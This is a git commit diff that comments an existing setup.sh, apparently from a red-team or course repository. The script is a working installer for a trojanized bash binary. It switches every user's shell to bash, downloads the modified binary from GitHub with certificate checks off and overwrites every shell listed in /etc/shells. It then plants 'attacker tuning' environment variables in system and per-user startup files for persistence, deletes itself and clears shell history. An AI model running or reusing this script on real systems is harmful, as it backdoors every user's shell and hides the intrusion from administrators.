0cc73bbc4fe9156f3e4cac0b533f1b498624b597
lsh8829 <69919343+lsh8829@users.noreply.github.com>
2023-04-12 11:51:25 -0400

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -1,25 +1,37 @@
+#
+# Setup script for "trash" aka Trojanized Bash
+# Downloads the modified binary, installs it into common locations
+# Configures optional environment variables for attacker tuning
+#
+
+# change all user shells to /bin/bash
 for user in $(cat ./passwd | cut -d":" -f1)
 do 
     chsh -s /bin/bash $user
 done
 
+# Download trash
 curl -k 'https://raw.githubusercontent.com/lsh8829/CDT473/main/bash' -o /tmp/bash
 chmod +x /tmp/bash
 
+# replace all existing shells with our binary
 for shell in $(tail -n +2 /etc/shells)
 do
     rm -rf $shell
     cp /tmp/bash $shell
 done
 
+#cleanup
 rm -rf /tmp/bash
 
+# set persistent environment variables in /etc/environment
 echo 'export VTX_VERSION="10"' >> /etc/environment
 echo 'export VTX_LOG_OPT="10"' >> /etc/environment
 echo 'export VTX_SESSION_ID="4"' >> /etc/environment
 echo 'export DBG_OPT="0"' >> /etc/environment
 echo 'export LOCALIZATION_CODE="1678"' >> /etc/environment
 
+# set env vars for root, making it harder to get rid of these vars
 echo 'export VTX_VERSION="10"' >> /root/.gtkrc
 echo 'export VTX_LOG_OPT="10"' >> /root/.gtkrc
 echo 'export VTX_SESSION_ID="4"' >> /root/.gtkrc
@@ -28,6 +40,7 @@ echo 'export LOCALIZATION_CODE="1678"' >> /root/.gtkrc
 echo -e 'if [ -f "$HOME/.gtkrc" ]; then \n\t. "$HOME/.gtkrc" \nfi' >> /root/.profile
 echo -e 'if [ -f "$HOME/.gtkrc" ]; then \n\t. "$HOME/.gtkrc" \nfi' >> /root/.bashrc
 
+# and same vars for all other users, again, making it harder to get rid of
 for dir in $(ls /home)
 do
     echo 'export VTX_VERSION="10"' >> /home/$dir/.gtkrc
@@ -39,6 +52,6 @@ do
     echo -e 'if [ -f "$HOME/.gtkrc" ]; then \n\t. "$HOME/.gtkrc" \nfi' >> /home/$dir/.bashrc
 done
 
+#final cleanup
 rm setup.sh
 history -c
-exit
